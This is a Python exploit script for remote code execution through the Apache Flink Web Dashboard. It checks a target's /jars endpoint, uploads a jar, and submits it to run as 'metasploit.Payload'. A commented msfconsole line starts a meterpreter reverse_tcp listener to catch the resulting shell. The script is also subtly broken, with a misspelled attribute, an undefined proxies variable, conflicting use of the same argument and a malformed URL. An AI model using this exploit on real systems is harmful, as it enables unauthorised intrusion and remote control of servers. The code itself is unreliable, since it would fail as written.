"""
auth: @l3_W0ng
version: 2.0
function: Apache Flink Web Dashboard RCE EXP and POC
usage:

"""


import sys
import json
import requests

def flink_check(vuln_url):
    r = requests.get(vuln_url)
    if r.status_code == 200 and len(r.content) > 0:
        print(vuln_url + 'may has Apache Flink Web Dashboard RCE vul')
        upload_jar(vuln_url)

    else:
        print(vuln_url + 'does not have Apache Flink Web Dashboard RCE vul')


def upload_jar(vuln_url):
    upload_url = vuln_url + '/upload'
    files = {
        'file':open(sys.argv[2],'rb')
    }
    r = requests.post(upload_url, files=files)
    if r.status_codes== 200 and 'filename' in r.content:
        print('upload success')
        json_str = json.loads(r.content)
        filename = json_str['filename'].split('/')[-1]
        submit_jar(vuln_url,filename)

    else:
        print('faild')

def submit_jar(vuln_url,filename):
    submit_url = vuln_url + filename + '/run?entry-class=metasploit.Payload'
    url = vuln_url[:-4]
    headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:55.0) Gecko/20100101 Firefox/55.0',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/json',
    'Referer': '%s' % url,
    'Content-Length': '123',
    'Connection': 'close'
    }
    payload = {
        "entryClass":"metasploit.Payload",
        "parallelism": 0,
        "programArgs": 0,
        "savepointPath": 0,
        "allowNonRestoredState": 0
    }

    r = requests.post(submit_url, headers=headers, data=payload, proxies=proxies)
    if r.status_code == 500 and 'org.apache.flink.client.program.ProgramInvocationException' in r.content:
        print("[+] Poc Send Success!\n")
        # print 'msfconsole  -q  -x "use exploit/multi/handler;set payload java/meterpreter/reverse_tcp;set lhost 10.10.20.166;set lport 8989;run"\n'
    else:
        print("[+] Poc Send Fail!")

"""
only for dected:
def POC_check(vuln_url):
    res = requests.get(url=vuln_url, timeout=3)
    data = {
        'msg': res.json(),
        'state': 1,
        'url': url,
    }
"""


if __name__ == '__main__':
    if len(sys.argv) == 3:
        ip = sys.argv[1]
        port = sys.argv[2]
        url = 'http://' + ip + ':' + port
        vuln_url = url + '/jars'
        flink_check(vuln_url=vuln_url)

    elif len(sys.argv) == 2:
        ip = sys.argv[1]
        port = '8081'
        url = 'http://' + ip + ':' + port
        vuln_url = url + '/jars'
        flink_check(vuln_url=vuln_url)


